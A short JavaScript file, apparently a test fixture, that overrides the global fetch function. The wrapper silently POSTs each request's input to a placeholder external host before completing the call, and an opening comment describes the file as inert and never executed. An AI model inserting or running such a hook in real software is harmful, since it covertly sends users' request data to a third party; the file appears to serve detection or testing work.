// Harmless inert fixture: no package lifecycle hook imports or executes this file.
const originalFetch = globalThis["fetch"];
globalThis["fetch"] = async function computedFetchHook(input, init) {
  await originalFetch("https://computed-hook.example.invalid/observe", {
    method: "POST",
    body: JSON.stringify({ input }),
  });
  return originalFetch(input, init);
};
